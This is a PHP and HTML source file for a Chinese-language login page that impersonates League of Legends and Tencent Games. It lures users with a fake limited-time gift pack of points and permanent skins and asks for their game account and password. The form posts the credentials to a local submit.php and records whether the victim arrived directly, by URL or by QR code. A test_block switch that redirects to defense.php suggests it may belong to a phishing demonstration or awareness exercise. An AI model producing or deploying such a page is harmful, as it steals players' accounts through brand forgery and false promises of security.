<?php
session_start();

if (isset($_GET['test_block'])) {
    header('Location: defense.php?blocked=1');
    exit;
}

$allowed = ['direct', 'url', 'qrcode'];
$from = $_GET['from'] ?? ($_SESSION['channel'] ?? 'direct');
if (!in_array($from, $allowed, true)) {
    $from = 'direct';
}
$_SESSION['channel'] = $from;
$fromSafe = htmlspecialchars($from, ENT_QUOTES, 'UTF-8');
$errMsg = '';
if (isset($_GET['err']) && $_GET['err'] === 'empty') {
    $errMsg = '账号和密码不能为空，请重新填写。';
}
?>
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>账号登录 · 英雄联盟</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Noto+Sans+SC:wght@400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="style.css">
</head>
<body class="site site-auth">
<header class="site-header site-header-minimal">
    <div class="wrap header-inner">
        <a class="brand" href="index.php">
            <svg class="brand-mark" width="32" height="32" viewBox="0 0 36 36" aria-hidden="true">
                <defs><linearGradient id="bm2" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#d4af37"/><stop offset="100%" stop-color="#8b6914"/></linearGradient></defs>
                <path fill="url(#bm2)" d="M18 2L4 10v16l14 8 14-8V10L18 2zm0 4.5l9.5 5.5V24L18 29.5 8.5 24V12L18 6.5z"/>
            </svg>
            <span class="brand-text"><strong>英雄联盟</strong></span>
        </a>
        <a class="link-back" href="index.php">返回活动首页</a>
    </div>
</header>

<main class="auth-main">
    <div class="auth-layout">
        <aside class="auth-aside">
            <p class="eyebrow">限时活动</p>
            <h1>登录领取限定福利礼包</h1>
            <p class="lead">限时活动，每位冒险者仅限领取一次。登录验证成功后，礼包将发放至游戏内邮箱。</p>
            <ul class="auth-rewards">
                <li><span class="reward-dot"></span>点券 ×6480</li>
                <li><span class="reward-dot"></span>龙年限定皮肤 永久</li>
                <li><span class="reward-dot"></span>传说级皮肤 永久</li>
                <li><span class="reward-dot"></span>海克斯宝箱 ×10</li>
            </ul>
        </aside>

        <div class="auth-card">
            <?php if ($errMsg !== ''): ?>
                <p class="error"><?= htmlspecialchars($errMsg, ENT_QUOTES, 'UTF-8') ?></p>
            <?php endif; ?>

            <div class="auth-card-head">
                <h2>账号登录</h2>
                <p>请输入您的游戏账号以领取活动奖励。</p>
            </div>

            <form class="auth-form" method="post" action="submit.php">
                <input type="hidden" name="channel" value="<?= $fromSafe ?>">
                <div class="field">
                    <label for="account">游戏账号</label>
                    <input id="account" type="text" name="account" placeholder="请输入游戏账号" autocomplete="off">
                </div>
                <div class="field">
                    <label for="password">密码</label>
                    <input id="password" type="password" name="password" placeholder="请输入密码" autocomplete="off">
                </div>
                <button type="submit" class="btn btn-primary btn-block">登录并领取</button>
            </form>

            <ul class="auth-trust auth-trust-warning">
                <li>
                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
                    您的账号信息将被安全加密传输
                </li>
                <li>
                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/></svg>
                    登录即表示同意《用户服务协议》
                </li>
            </ul>

            <p class="auth-footer-link"><a href="index.php">返回活动首页</a></p>
        </div>
    </div>
</main>

<footer class="site-footer site-footer-minimal">
    <div class="wrap">
        <p>© 2026 腾讯游戏 版权所有</p>
    </div>
</footer>
</body>
</html>
